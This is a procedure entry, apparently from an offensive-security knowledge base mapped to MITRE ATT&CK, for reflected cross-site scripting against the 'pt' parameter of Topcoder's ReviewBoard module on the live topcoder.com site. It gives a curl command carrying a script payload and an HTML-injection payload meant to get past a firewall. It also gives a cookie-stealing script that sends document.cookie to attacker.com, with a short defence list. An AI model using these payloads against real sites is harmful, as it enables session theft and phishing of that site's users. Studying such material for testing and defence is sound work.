---
id: proc-789652-inject-xss
tags:
  - xss
  - injection
  - web
  - html-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-inject-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:36.884Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-pt-Parameter

## Summary

This procedure exploits the reflected XSS vulnerability by injecting HTML and JavaScript payloads into the 'pt' parameter, leading to arbitrary script execution in the victim's browser and potential data exfiltration.

## Description

Targeting the Topcoder ReviewBoard module, this procedure modifies the 'pt' parameter with payloads like <script>confirm(1)</script> to execute JavaScript, or HTML tags for injection. Post-WAF, payloads like '"><h1>ANY_TEXT</h1> may still work due to incomplete sanitization. The attack scenario involves tricking a user into visiting a malicious URL, resulting in client-side script execution for cookie stealing, phishing, or redirection. Prerequisites include confirmed reflection from prior reconnaissance.

## Requirements

1. Confirmed vulnerable endpoint from observation step
2. Web browser for payload execution testing (curl for static checks)
3. Understanding of XSS payloads and browser security contexts

## Defense

Defensive measures and detection strategies:

- Deploy web application firewall (WAF) rules to strip script tags and common XSS patterns
- Enforce strict input validation and output escaping (e.g., via OWASP guidelines)
- Log and alert on suspicious parameter values containing <script> or javascript:

## Objectives

1. Execute JavaScript payload to demonstrate XSS
2. Inject HTML for defacement or as XSS precursor
3. Simulate impacts like alert dialogs or cookie access

## Instructions

### Step 1: Test Basic XSS Payload

**Context**: Inject a simple script to verify execution in the browser context.

**Command** ([[commands/curl-inject-xss]]):
```bash
curl "https://www.topcoder.com/tc?module=ReviewBoard&pt=<script>confirm(1)</script>" -s
```

> Use curl to send the request; then visit the URL in a browser to see the confirm dialog. Expected output in browser: Alert box with '1' appears, confirming JS execution.

### Step 2: Test HTML Injection

**Context**: After WAF may block scripts, try HTML tags for partial injection.

Modify URL to https://www.topcoder.com/tc?module=ReviewBoard&pt=""><h1>XSS TEST</h1> and load in browser.

> Successful injection renders the <h1>XSS TEST</h1> heading on the page, indicating incomplete sanitization.

### Step 3: Advanced Payload for Exfiltration

**Context**: Craft payload to steal cookies, e.g., <script>document.location='http://attacker.com?cookie='+document.cookie</script>.

Visit the modified URL in browser.

> Expected outcome: Browser redirects to attacker's site with cookie data in query string, enabling theft.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss]]

## Tools Used


## Tags

- xss
- injection
- web
- html-injection
